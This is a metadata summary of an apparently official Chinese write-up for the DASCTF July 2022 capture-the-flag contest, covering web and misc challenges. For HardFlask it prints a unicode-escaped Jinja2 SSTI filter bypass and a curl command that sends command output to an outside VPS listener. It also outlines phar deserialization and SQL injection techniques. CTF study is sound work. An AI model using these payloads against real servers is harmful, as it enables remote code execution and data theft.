...
quality: high
full_path: DASCTF｜2022DASCTF7月赋能赛官方Write_Up.full.md
meta_path: DASCTF｜2022DASCTF7月赋能赛官方Write_Up.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 'DASCTF 2022 7 月赋能赛官方 Write Up。DASCTF 2022 7 月赋能赛官方 WP，4 Web + 4 Misc + 取证综合。。关键路径：HardFlask: unicode 编码绕 SSTI 过滤 → 盲注外带数据 → 找 popen 子类(133) 触发命令。经验：当 SSTI 过滤了 `__class__` 等关键字，unicode 编码 `\u005f\...'
category: web
...
contest_type: open
wp_url: https://www.ctfiot.com/50504.html
reasoning_chain:
- HardFlask：Flask SSTI 输入框 → 触发点：黑名单过滤（}, {, [, ], _, . 等）→ 假设：必须用 unicode 编码绕过
- 动作：{%if("|attr("\u005f\u005f\u0063\u006c\u0061\u0073\u0073\u005f\u005f"))%}success{%endif%} → 触发点：unicode bypass SSTI
- 假设：必须外带命令执行 → 假设：找含 popen 的子类 → 动作：遍历 500 个子类找 133 号含 popen 方法
- 动作：构造 curl 47.xxx.xxx.72:2333 -d "`ls /`" 触发 popen → vps 上 nc 接收 → 假设：读完 /f1agggghere 后 cat flag
- ezgetshell：phar 反序列化 + 条件竞争 + 文件上传 → 触发点：phar:// 协议触发反序列化
- NewSer：composer.json 泄露 + fakerphp 引用绕 __wakeup → 假设：分析依赖找到 gadget
- 绝对防御：jsfinder 找 JS 路径 + SQL 注入 → 假设：动态爬虫 + SQLMap 跑点
- 听说你是个侦探：推理破压缩密码 → Colorful Strips：YCbCr vs RGB 还原
failed_attempts:
- 试图直接 {{config.__class__.__init__.__globals__['os'].popen('ls').read()}} → 失败：_ . __class__ 等全被黑名单
- 试图用 request/args/values 注入 → 失败：都被过滤
- 试图不解压直接读 phar → 失败：必须先上传 phar 文件再触发反序列化
key_observations:
- SSTI 过滤了 `__class__` 等关键字时，unicode 编码 `\u005f\u005f...` 是万能绕法
- '{%if(...)|attr()%}1{%endif%} 形式比 {%print%} 更通用，能绕过 print 关键字过滤'
- 外带数据法（curl + vps nc）是 SSTI 盲注的标准手法
- phar 反序列化是 PHP 文件上传漏洞的延伸，触发条件包括 file_exists / is_dir / fopen 等
- composer.json 泄露 + fakerphp 引用 = PHP 反序列化新型 gadget 入口
prerequisites:
- Jinja2 SSTI 注入原理（__class__/__mro__/__subclasses__）
- Unicode 转义绕过（\u005f）
- PHP phar 反序列化（phar:// 协议）
- 条件竞争（race condition）文件上传
- JSFinder 动态 JS 爬虫 + SQLMap 自动化注入
---
